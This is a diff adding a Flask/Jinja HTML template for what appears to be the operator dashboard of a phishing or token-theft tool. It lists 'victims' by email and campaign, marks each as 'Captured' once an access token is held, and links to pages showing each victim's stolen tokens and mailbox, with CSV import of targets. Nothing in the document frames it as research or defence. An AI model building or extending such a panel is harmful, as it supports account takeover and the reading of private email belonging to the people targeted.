@@ -1,0 +1,28 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="container">
+    <h2>Recipients</h2>
+    <a href="{{ url_for('import_csv') }}" class="btn btn-success mb-3">Import CSV</a>
+    <table class="table table-striped">
+        <thead>
+            <tr><th>Email</th><th>Name</th><th>Campaign</th><th>Status</th><th>Actions</th></tr>
+        </thead>
+        <tbody>
+            {% for victim in victims %}
+            <tr>
+                <td>{{ victim.email }}</td>
+                <td>{{ victim.first_name or '' }} {{ victim.last_name or '' }}</td>
+                <td>{{ victim.campaign_name or 'N/A' }}</td>
+                <td><span class="badge bg-{{ 'success' if victim.access_token else 'warning' }}">{{ 'Captured' if victim.access_token else 'Pending' }}</span></td>
+                <td>
+                    <a href="{{ url_for('view_tokens', victim_id=victim.id) }}" class="btn btn-sm btn-info">Tokens</a>
+                    <a href="{{ url_for('view_inbox', victim_id=victim.id) }}" class="btn btn-sm btn-secondary">Inbox</a>
+                </td>
+            </tr>
+            {% else %}
+            <tr><td colspan="5" class="text-center">No recipients found</td></tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+{% endblock %}
